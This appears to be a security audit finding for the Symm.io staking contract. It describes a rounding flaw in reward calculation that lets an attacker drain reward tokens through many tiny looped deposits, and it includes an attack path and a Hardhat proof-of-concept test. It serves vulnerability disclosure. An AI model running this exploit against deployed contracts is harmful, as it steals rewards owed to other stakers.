# Precession loss in Stacking allows to drain rewards

### Summary

Currently the Staking contract accepts different tokens as rewards. In case this reward token is configured to a token like WBTC, which has a wei price of > 0, it is possible to drain reward tokens from the staking contract.

### Root Cause

The root cause for this issue is scaling rewards by 1e18 before dividing by total supply:

https://github.com/sherlock-audit/2025-03-symm-io-stacking/blob/main/token/contracts/staking/SymmStaking.sol#L200

Total supply is increased by depositing tokens in a loop

### Internal Pre-conditions

1. User deposits tokens into staking contract

### External Pre-conditions

Low GAS price on Base, high price of WBTC

### Attack Path

1. Attacker stakes tokens into symm staking
2. After some time, the attacker deposits the same amount of tokens in a loop, as many time as possible
3. For every Iteration of the loop, the attacker will gain one wei of reward tokens
4. He withdraws all deposited tokens in the loop, as well as claims rewards for instant profit

### Impact

Drain reward contract. / Instant rewards without having to stake for more time.

In case 1 wei of wbtc is worth more then one deposit call on base in gas fees, the attack becomes profitable.

### PoC

Add following test to the staking tests. It will show addional 100 wei of wbtc rewards claimed, without commiting capital.
 
```js
it("drain 100 rewards", async function () {
			
			const depositUser1 = "302400"
			const depositUser2 = "1"
			const tdepositUser2 = "100"

			await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositUser1)
			await stakingToken.connect(user2).approve(await symmStaking.getAddress(), tdepositUser2)

			await symmStaking.connect(user1).deposit(depositUser1, user1.address)

			const rewardAmount = "604800"
			await usdtToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
			await symmStaking.connect(admin).configureRewardToken(await usdtToken.getAddress(), true)
			await symmStaking.connect(admin).notifyRewardAmount([await usdtToken.getAddress()], [rewardAmount])
			
			await time.increase(200)
			
			for (let i = 1; i <= 100; i++) {
				await symmStaking.connect(user2).deposit(depositUser2, user2.address)
			}
			
			const contractBalanceUser2 = await symmStaking.balanceOf(user2.address)
			await symmStaking.connect(user2).withdraw(contractBalanceUser2, user2.address)
			
			

			const user1BalanceBefore = await usdtToken.balanceOf(user1.address)
			await symmStaking.connect(user1).claimRewards()
			const user1BalanceAfter = await usdtToken.balanceOf(user1.address)
			const user1Claimed = user1BalanceAfter - user1BalanceBefore
			
			const user2BalanceBefore = await usdtToken.balanceOf(user2.address)
			await symmStaking.connect(user2).claimRewards()
			const user2BalanceAfter = await usdtToken.balanceOf(user2.address)
			const user2Claimed = user2BalanceAfter - user2BalanceBefore
			const contractBalanceUser1 = await symmStaking.balanceOf(user1.address)
			
			expect(contractBalanceUser1).to.equal(depositUser1)

			const contractRewardBalance = await usdtToken.balanceOf(symmStaking)
			
			//Rewards should be 200 after 200 sec.
			//Test fails with 301 instead of 200
			expect(user1Claimed).to.equal(200)
		})
```
